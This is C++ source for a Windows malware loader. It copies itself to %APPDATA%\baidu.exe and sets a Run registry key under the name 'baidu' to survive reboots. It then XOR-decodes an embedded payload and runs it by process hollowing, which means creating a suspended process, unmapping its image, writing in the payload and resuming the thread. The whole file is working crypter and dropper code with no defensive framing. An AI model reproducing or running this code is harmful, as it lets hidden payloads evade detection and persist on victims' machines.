//   MemPE.cpp   :   Defines   the   entry   point   for   the   DLL   application. 
// 
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(linker,"/NODEFAULTLIB:LIBC")
#include "res/a.h"
//////////////////////////////////////////////////////////////////////////
typedef IMAGE_SECTION_HEADER(*PIMAGE_SECTION_HEADERS)[1];
//��������Ĵ�С 
unsigned long GetAlignedSize(unsigned long Origin, unsigned long Alignment)
{
    return (Origin + Alignment - 1) / Alignment * Alignment;
}

//   �������pe��������Ҫռ�ö����ڴ� 
//   δֱ��ʹ��OptionalHeader.SizeOfImage��Ϊ�������Ϊ��˵�еı��������ɵ�exe���ֵ����0 
unsigned long CalcTotalImageSize(PIMAGE_DOS_HEADER MzH, unsigned long FileLen,
                                 PIMAGE_NT_HEADERS peH, PIMAGE_SECTION_HEADERS
                                 peSecH)
{
    unsigned long res;
    //   ����peͷ�Ĵ�С 
    res = GetAlignedSize(peH->OptionalHeader.SizeOfHeaders, peH
                         ->OptionalHeader.SectionAlignment);
    //   �������нڵĴ�С 
    for (int i = 0; i < peH->FileHeader.NumberOfSections; ++i)
	{
        if (peSecH[i]->PointerToRawData + peSecH[i]->SizeOfRawData > FileLen)
		{
            //   �����ļ���Χ 
            return 0;
        }
        else if (peSecH[i]->VirtualAddress)
		{
            //��������ĳ�ڵĴ�С 
            if (peSecH[i]->Misc.VirtualSize)
			{
                res = GetAlignedSize(peSecH[i]->VirtualAddress + peSecH[i]
                                     ->Misc.VirtualSize, peH
                                     ->OptionalHeader.SectionAlignment);
            }
            else{
                res = GetAlignedSize(peSecH[i]->VirtualAddress + peSecH[i]
                                     ->SizeOfRawData, peH
                                     ->OptionalHeader.SectionAlignment);
            }
        }
        else if (peSecH[i]->Misc.VirtualSize < peSecH[i]->SizeOfRawData)
		{
            res += GetAlignedSize(peSecH[i]->SizeOfRawData, peH
                                  ->OptionalHeader.SectionAlignment);
        }
        else
		{
            res += GetAlignedSize(peSecH[i]->Misc.VirtualSize, peH
                                  ->OptionalHeader.SectionAlignment);
        }
    }
    return res;
}

//   ����pe���ڴ沢�������н� 
BOOL AlignPEToMem(void *Buf, long Len, PIMAGE_NT_HEADERS &peH,
                  PIMAGE_SECTION_HEADERS &peSecH, void * &Mem, unsigned long
                  &ImageSize)
{
    PIMAGE_DOS_HEADER SrcMz;            //DOSͷ 
    PIMAGE_NT_HEADERS SrcPeH;            //PEͷ 
    PIMAGE_SECTION_HEADERS SrcPeSecH;    //�ڱ� 
    SrcMz = (PIMAGE_DOS_HEADER)Buf;
    if (Len < sizeof(IMAGE_DOS_HEADER))
	{
        return FALSE;
    }
    if (SrcMz->e_magic != IMAGE_DOS_SIGNATURE)
	{
        return FALSE;
    }
    if (Len < SrcMz->e_lfanew + (long)sizeof(IMAGE_NT_HEADERS))
	{
        return FALSE;
    }
    SrcPeH = (PIMAGE_NT_HEADERS)((int)SrcMz + SrcMz->e_lfanew);
    if (SrcPeH->Signature != IMAGE_NT_SIGNATURE)
	{
        return FALSE;
    }
    if ((SrcPeH->FileHeader.Characteristics &IMAGE_FILE_DLL) || (SrcPeH
        ->FileHeader.Characteristics &IMAGE_FILE_EXECUTABLE_IMAGE == 0) || 
        (SrcPeH->FileHeader.SizeOfOptionalHeader != sizeof
        (IMAGE_OPTIONAL_HEADER)))
	{
        return FALSE;
    }
    SrcPeSecH = (PIMAGE_SECTION_HEADERS)((int)SrcPeH + sizeof(IMAGE_NT_HEADERS));
    ImageSize = CalcTotalImageSize(SrcMz, Len, SrcPeH, SrcPeSecH);
    if (ImageSize == 0)
	{
        return FALSE;
    }
    Mem = VirtualAlloc(NULL, ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    //   �����ڴ� 
    if (Mem)
	{
        //   ������Ҫ���Ƶ�PEͷ�ֽ���
		int i;
        unsigned long l = SrcPeH->OptionalHeader.SizeOfHeaders;
        for (i = 0; i < SrcPeH->FileHeader.NumberOfSections; ++i)
        if ((SrcPeSecH[i]->PointerToRawData) && (SrcPeSecH[i]->PointerToRawData < l))
		{
            l = SrcPeSecH[i]->PointerToRawData;
        }
        memmove(Mem, SrcMz, l);
        peH = (PIMAGE_NT_HEADERS)((int)Mem + ((PIMAGE_DOS_HEADER)Mem)->e_lfanew);
        peSecH = (PIMAGE_SECTION_HEADERS)((int)peH + sizeof(IMAGE_NT_HEADERS));
        void *Pt = (void*)((unsigned long)Mem + GetAlignedSize(peH
                    ->OptionalHeader.SizeOfHeaders, peH
                    ->OptionalHeader.SectionAlignment));
        for (i = 0; i < peH->FileHeader.NumberOfSections; ++i)
		{
            //   ��λ�ý����ڴ��е�λ�� 
            if (peSecH[i]->VirtualAddress)
			{
                Pt = (void*)((unsigned long)Mem + peSecH[i]->VirtualAddress);
            }
            if (peSecH[i]->SizeOfRawData)
			{
                //   �������ݵ��ڴ� 
                memmove(Pt, (const void*)((unsigned long)(SrcMz) + peSecH[i]
                        ->PointerToRawData), peSecH[i]->SizeOfRawData);

                if (peSecH[i]->Misc.VirtualSize < peSecH[i]->SizeOfRawData)
				{
                    Pt = (void*)((unsigned long)Pt + GetAlignedSize(peSecH[i]
                          ->SizeOfRawData, peH->OptionalHeader.SectionAlignment));
                }
                else
                //   pt   ��λ����һ�ڿ�ʼλ�� 
				{
						Pt = (void*)((unsigned long)Pt + GetAlignedSize(peSecH[i]
                          ->Misc.VirtualSize, peH
                          ->OptionalHeader.SectionAlignment));
				}
	}
    else
	{
        Pt = (void*)((unsigned long)Pt + GetAlignedSize(peSecH[i]
              ->Misc.VirtualSize, peH->OptionalHeader.SectionAlignment));
    }
}

//-------------------------------------------------------------------------

}
//-------------------------------------------------------------------------
return TRUE;
}
//-------------------------------------------------------------------------
typedef void *(__stdcall *pfVirtualAllocEx)(unsigned long, void *, unsigned
               long, unsigned long, unsigned long);
pfVirtualAllocEx MyVirtualAllocEx = NULL;
BOOL IsNT()
{
    return MyVirtualAllocEx != NULL;
}

//   ������ǳ��������� 
char *PrepareShellExe(char *CmdParam, unsigned long BaseAddr, unsigned long
                      ImageSize)
{
    if (IsNT())
	{
        char *Buf = new char[256];
        memset(Buf, 0, 256);
        GetModuleFileName(0, Buf, 256);
        lstrcat(Buf, CmdParam);
        return Buf; //   ��ǵ��ͷ��ڴ�;-) 
    }
    else
	{
        //   Win98�µĴ�����ο�ԭ��;-) 
        //   http://community.csdn.net/Expert/topic/4416/4416252.xml?temp=8.709133E-03 
        return NULL;
    }
}

//   �Ƿ�������ض����б� 
BOOL HasRelocationTable(PIMAGE_NT_HEADERS peH)
{
    return (peH ->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) && (peH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
}
//-------------------------------------------------------------------------
#pragma pack(push,   1) 
typedef struct
{
    unsigned long VirtualAddress;
    unsigned long SizeOfBlock;
} *PImageBaseRelocation;
#pragma pack(pop) 
//   �ض���PE�õ��ĵ�ַ 
void DoRelocation(PIMAGE_NT_HEADERS peH, void *OldBase, void *NewBase)
{
    unsigned long Delta = (unsigned long)NewBase - peH
                           ->OptionalHeader.ImageBase;
    PImageBaseRelocation p = (PImageBaseRelocation)((unsigned long)OldBase +
                              peH
                              ->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    while (p->VirtualAddress + p->SizeOfBlock){
        unsigned short *pw = (unsigned short*)((int)p + sizeof(*p));
        for (unsigned int i = 1; i <= (p->SizeOfBlock - sizeof(*p)) / 2; ++i)
		{
            if ((*pw) &0xF000 == 0x3000)
			{
                unsigned long *t = (unsigned long*)((unsigned long)(OldBase) +
                                    p->VirtualAddress + ((*pw) &0x0FFF));
                *t += Delta;
            }
            ++pw;
        }
        p = (PImageBaseRelocation)pw;
    }
}

//ж��ԭ���ռ���ڴ� 
BOOL UnloadShell(HANDLE ProcHnd, unsigned long BaseAddr)
{
    typedef unsigned long(__stdcall *pfZwUnmapViewOfSection)(unsigned long,
                          unsigned long);
    pfZwUnmapViewOfSection ZwUnmapViewOfSection = NULL;
    BOOL res = FALSE;
    HMODULE m = LoadLibrary("ntdll");
    if (m)
	{
        ZwUnmapViewOfSection = (pfZwUnmapViewOfSection)GetProcAddress(m, 
                                "ZwUnmapViewOfSection");
        if (ZwUnmapViewOfSection)
		{
            res = (ZwUnmapViewOfSection((unsigned long)ProcHnd, BaseAddr) == 0);
        }
        FreeLibrary(m);
    }
    return res;
}

//������ǽ��̲���ȡ���ַ����С�͵�ǰ����״̬ 
BOOL CreateChild(char *Cmd, CONTEXT &Ctx, HANDLE &ProcHnd, HANDLE &ThrdHnd,
                 unsigned long &ProcId, unsigned long &BaseAddr, unsigned long
                 &ImageSize)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    unsigned long old;
    MEMORY_BASIC_INFORMATION MemInfo;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    BOOL res = CreateProcess(NULL, Cmd, NULL, NULL, FALSE, CREATE_SUSPENDED,
                             NULL, NULL, &si, &pi); //   �Թ���ʽ���н���; 
    if (res)
	{
        ProcHnd = pi.hProcess;
        ThrdHnd = pi.hThread;
        ProcId = pi.dwProcessId;
        //��ȡ��ǽ�������״̬��[ctx.Ebx+8]�ڴ洦�������ǽ��̵ļ��ػ�ַ��ctx.Eax�������ǽ��̵���ڵ�ַ 
        Ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(ThrdHnd, &Ctx);
        ReadProcessMemory(ProcHnd, (void*)(Ctx.Ebx + 8), &BaseAddr, sizeof
                          (unsigned long), &old); //   ��ȡ���ػ�ַ 
        void *p = (void*)BaseAddr;
        //   ������ǽ���ռ�е��ڴ� 
        while (VirtualQueryEx(ProcHnd, p, &MemInfo, sizeof(MemInfo)))
		{
            if (MemInfo.State = MEM_FREE)
			{
                break;
            }
            p = (void*)((unsigned long)p + MemInfo.RegionSize);
        }
        ImageSize = (unsigned long)p - (unsigned long)BaseAddr;
    }
    return res;
}

//   ������ǽ��̲���Ŀ������滻��Ȼ��ִ�� 
HANDLE AttachPE(char *CmdParam, PIMAGE_NT_HEADERS peH, PIMAGE_SECTION_HEADERS peSecH, 
               void *Ptr, unsigned long ImageSize, unsigned long
                &ProcId)
{
    HANDLE res = INVALID_HANDLE_VALUE;
    CONTEXT Ctx;
    HANDLE Thrd;
    unsigned long Addr, Size;
    char *s = PrepareShellExe(CmdParam, peH->OptionalHeader.ImageBase,
                              ImageSize);
    if (s == NULL)
	{
        return res;
    }
    if (CreateChild(s, Ctx, res, Thrd, ProcId, Addr, Size))
	{
        void *p = NULL;
        unsigned long old;
        if ((peH->OptionalHeader.ImageBase == Addr) && (Size >= ImageSize))
		{
            //��ǽ��̿�������Ŀ����̲��Ҽ��ص�ַһ�� 
            p = (void*)Addr;
            VirtualProtectEx(res, p, Size, PAGE_EXECUTE_READWRITE, &old);
        }
        else if (IsNT())
		{
            if (UnloadShell(res, Addr))
			{
                //ж����ǽ���ռ���ڴ� 
                p = MyVirtualAllocEx((unsigned long)res, (void*)peH
                                     ->OptionalHeader.ImageBase, ImageSize,
                                     MEM_RESERVE | MEM_COMMIT,
                                     PAGE_EXECUTE_READWRITE);
            }
            if ((p == NULL) && HasRelocationTable(peH))
			{
                //�����ڴ�ʧ�ܲ���Ŀ�����֧���ض��� 
                p = MyVirtualAllocEx((unsigned long)res, NULL, ImageSize,
                                     MEM_RESERVE | MEM_COMMIT,
                                     PAGE_EXECUTE_READWRITE);
                if (p)
				{
                    DoRelocation(peH, Ptr, p);
                }
                //�ض��� 
            }
        }
        if (p)
		{
            WriteProcessMemory(res, (void*)(Ctx.Ebx + 8), &p, sizeof(DWORD), &old);
            //����Ŀ��������л����еĻ�ַ 
            peH->OptionalHeader.ImageBase = (unsigned long)p;
            if (WriteProcessMemory(res, p, Ptr, ImageSize, &old))
			{
                //����PE���ݵ�Ŀ����� 
                Ctx.ContextFlags = CONTEXT_FULL;
                if ((unsigned long)p == Addr)
				{
                    Ctx.Eax = peH->OptionalHeader.ImageBase + 
                       peH->OptionalHeader.AddressOfEntryPoint;
                }
                //�������л����е���ڵ�ַ 
                else{
                    Ctx.Eax = (unsigned long)p + 
                               peH->OptionalHeader.AddressOfEntryPoint;
                }
                SetThreadContext(Thrd, &Ctx); //�������л��� 
                ResumeThread(Thrd);            //ִ�� 
                CloseHandle(Thrd);
            }
            else
			{
                //����ʧ��,ɱ����ǽ��� 
                TerminateProcess(res, 0);
                CloseHandle(Thrd);
                CloseHandle(res);
                res = INVALID_HANDLE_VALUE;
            }
        }
        else
		{
            //   ����ʧ��,ɱ����ǽ��� 
            TerminateProcess(res, 0);
            CloseHandle(Thrd);
            CloseHandle(res);
            res = INVALID_HANDLE_VALUE;
        }
    }
    delete [] s;
    return res;
}

/*
{   *******************************************************   } 
{   *   ���ڴ��м��ز�����exe                             *   } 
{   *******************************************************   } 
{   *   ������                                                } 
{   *   Buffer:   �ڴ��е�exe��ַ                             } 
{   *   Len:   �ڴ���exeռ�ó���                              } 
{   *   CmdParam: �����в���(������exe�ļ�����ʣ�������в���) } 
{   *   ProcessId: ���صĽ���Id                               } 
{   *   ����ֵ: ����ɹ��򷵻ؽ��̵�Handle(ProcessHandle),    } 
{               ���ʧ���򷵻�INVALID_HANDLE_VALUE            } 
{   *******************************************************   } 
*/
HANDLE MemExecute(void *ABuffer, long Len, char *CmdParam, unsigned
                  long*ProcessId)
{
    HANDLE res = INVALID_HANDLE_VALUE;
    PIMAGE_NT_HEADERS peH;
    PIMAGE_SECTION_HEADERS peSecH;
    void *Ptr;
    unsigned long peSz;
    if (AlignPEToMem(ABuffer, Len, peH, peSecH, Ptr, peSz))
	{
        res = AttachPE(CmdParam, peH, peSecH, Ptr, peSz, *ProcessId);
        VirtualFree(Ptr, peSz, MEM_DECOMMIT);
    }
    return res;
}

//   ��ʼ�� 
class CInit
{
public:
CInit()
{
MyVirtualAllocEx = 
(pfVirtualAllocEx)GetProcAddress(GetModuleHandle("Kernel32"), "VirtualAllocEx");
}
}Init;
//-------------------------------------------------------------------------

//////////////////����//////////////////////////
///////////////////////////////////////////////
//��vc�н���֧��mfc��console����
/*
CFile f;
if (f.Open("target.exe", CFile::modeRead))
{
    void *lpBuf = new char[f.GetLength()];
    f.Read(lpBuf, f.GetLength());
    unsigned long ProcessId;
    HANDLE MemExecute(void *, long, char *, unsigned long*);
    MemExecute(lpBuf, f.GetLength(), "", &ProcessId);
    f.Close();
    delete [] lpBuf;
}
*/
//////////////////////////////////////////////////////////////////////////
BOOL RegSetAutoRun() //AutoRun Test
{
	HKEY  hKey;
	DWORD nRetSize;
	TCHAR self[MAX_PATH];
	TCHAR path[MAX_PATH];
	PCHAR  lpSubKeyAutoRun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	PCHAR  AutoRun = "baidu";
	GetModuleFileName(NULL, self, MAX_PATH);//ȡ�õ�ǰģ�������·������
	ExpandEnvironmentStrings("%APPDATA%\\baidu.exe", path, MAX_PATH);
	nRetSize = strlen(path);
	if (nRetSize == 0)
	{
		return FALSE;
	}
	nRetSize++;
	//MessageBox(NULL, path, (LPCSTR)iLen, NULL);
	CopyFile(self, path, false);
	//WriteRegStr(HKEY_LOCAL_MACHINE, lpSubKeyAutoRun, AutoRun, path);
	if (RegCreateKey(HKEY_LOCAL_MACHINE, lpSubKeyAutoRun, &hKey) == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, AutoRun, NULL,
			REG_SZ, (LPBYTE)path, sizeof(TCHAR)*nRetSize);
		RegCloseKey(hKey);
		return TRUE;
	}
	return FALSE;
}
/*
BOOL RegSetAutoRun64()
{
	HKEY  hKey;
	DWORD nRetSize;
	TCHAR self[MAX_PATH];
	TCHAR path[MAX_PATH];
	PCHAR  lpSubKeyAutoRun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	PCHAR  AutoRun = "baidu";
	GetModuleFileName(NULL, self, MAX_PATH);//ȡ�õ�ǰģ�������·������
	ExpandEnvironmentStrings("%APPDATA%\\baidu.exe", path, MAX_PATH);
	nRetSize = strlen(path);
	if (nRetSize == 0)
	{
		return FALSE;
	}
	nRetSize++;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKeyAutoRun, 0, KEY_WRITE | KEY_WOW64_64KEY, &hKey);
	RegSetValueEx(hKey, AutoRun, NULL, REG_SZ, (LPBYTE)path, sizeof(TCHAR)*nRetSize);
	RegCloseKey(hKey);
}*/
//////////////////////////////////////////////////////////////////////////
int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in_opt LPSTR lpCmdLine, __in int nShowCmd )
{
	RegSetAutoRun();
	//RegSetAutoRun64();
	//////////////////////////////////////////////////////////////////////////
    unsigned long ProcessId;
    HANDLE MemExecute(void *, long, char *, unsigned long*);
	for(int i = 0; i < sizeof(aArray); i++)
	{
		//szArray[i] = ~ szArray[i]; // ȡ�� ~
		aArray[i] = aArray[i] ^ 123; // ��� ^
	}
    MemExecute(aArray, sizeof(aArray), "", &ProcessId);
	//////////////////////////////////////////////////////////////////////////

	return 0;
}